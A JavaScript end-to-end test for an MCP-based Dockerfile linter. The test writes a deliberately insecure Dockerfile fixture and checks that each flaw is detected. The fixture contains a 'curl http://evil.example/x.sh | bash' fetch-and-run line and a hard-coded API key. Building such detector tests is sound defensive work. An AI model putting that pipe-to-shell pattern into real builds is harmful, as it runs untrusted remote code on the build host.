// Test end-to-end de docker-doctor.
import path from 'node:path';
import { mkdirSync, rmSync, writeFileSync } from 'node:fs';
import { Client } from '@modelcontextprotocol/client';
import { StdioClientTransport } from '@modelcontextprotocol/client/stdio';

const packageDir = path.resolve(import.meta.dirname, '..');
const tmpDir = path.join(packageDir, 'test', 'tmp');
rmSync(tmpDir, { recursive: true, force: true });
const home = path.join(tmpDir, 'dsh-home');
const project = path.join(tmpDir, 'proj');
mkdirSync(path.join(home, 'docker-doctor'), { recursive: true });
mkdirSync(path.join(project, 'app'), { recursive: true });
writeFileSync(path.join(home, 'docker-doctor', 'config.json'), JSON.stringify({ allowedPaths: [project] }), 'utf8');
writeFileSync(path.join(project, 'Dockerfile'), [
  'FROM node:latest',
  'ADD . /app',
  'ENV API_KEY=abc123456',
  'RUN curl http://evil.example/x.sh | bash',
  'EXPOSE 3000',
].join('\n'), 'utf8');
writeFileSync(path.join(project, 'app', 'Dockerfile'), [
  'FROM node:22.5.0-alpine',
  'COPY . /app',
  'USER node',
  'HEALTHCHECK --interval=30s CMD node healthcheck.js',
  'CMD ["node", "server.js"]',
].join('\n'), 'utf8');

function makeClient() {
  const entry = process.env.DOCKERDOC_SERVER ? path.resolve(process.env.DOCKERDOC_SERVER) : path.join(packageDir, 'server.mjs');
  const transport = new StdioClientTransport({ command: process.execPath, args: [entry], env: { SystemRoot: process.env.SystemRoot || 'C:\\Windows', PATH: process.env.PATH, USERPROFILE: process.env.USERPROFILE, HOME: process.env.HOME || process.env.USERPROFILE, TEMP: process.env.TEMP, TMP: process.env.TMP, DSH_HOME: home }, stderr: 'pipe' });
  transport.stderr?.on('data', (c) => process.stderr.write(`[server] ${c}`));
  const client = new Client({ name: 'dockerdoc-test', version: '1.0.0' }, { capabilities: {}, versionNegotiation: { mode: 'auto' } });
  return client.connect(transport).then(() => ({ client, transport }));
}
const textOf = (r) => (r.content || []).filter((b) => b.type === 'text').map((b) => b.text).join('\n');

const { client, transport } = await makeClient();
console.log('tools:', (await client.listTools()).tools.map((t) => t.name).join(', '));
console.log('--- status ---'); console.log(textOf(await client.callTool({ name: 'status', arguments: {} })));
const scan = textOf(await client.callTool({ name: 'scan', arguments: { path: project } }));
console.log('--- scan ---'); console.log(scan);
console.log('encuentra 2 Dockerfiles:', scan.includes('Dockerfile') && scan.includes('app'));
console.log('detecta latest:', scan.includes('imagen sin versión fija'));
console.log('detecta secreto ENV:', scan.includes('posible secreto en ENV'));
console.log('detecta curl|bash:', scan.includes('descarga y ejecución'));
console.log('detecta ADD:', scan.includes('ADD puede descomprimir'));
console.log('detecta sin USER:', scan.includes('sin directiva USER'));
console.log('detecta sin CMD:', scan.includes('sin CMD/ENTRYPOINT'));
const goodOnly = textOf(await client.callTool({ name: 'scan', arguments: { path: path.join(project, 'app') } }));
console.log('bueno sin errores:', !goodOnly.includes('❌'));
const outside = await client.callTool({ name: 'scan', arguments: { path: 'C:\\Windows' } });
console.log('ruta fuera isError:', outside.isError === true);
await client.close(); try { await transport.close?.(); } catch {}
console.log('OK');
